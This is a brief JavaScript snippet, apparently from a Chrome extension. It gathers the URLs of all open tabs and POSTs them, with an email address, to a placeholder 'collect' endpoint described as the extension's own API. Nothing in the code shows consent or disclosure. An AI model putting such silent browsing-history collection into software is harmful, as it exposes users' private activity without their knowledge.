// Sends an email address and visited URLs to the extension's own API.
chrome.tabs.query({}, (tabs) => {
  const payload = { email: "user@example.com", history: tabs.map((t) => t.url) };
  fetch("https://api.example.com/collect", { method: "POST", body: JSON.stringify(payload) });
});
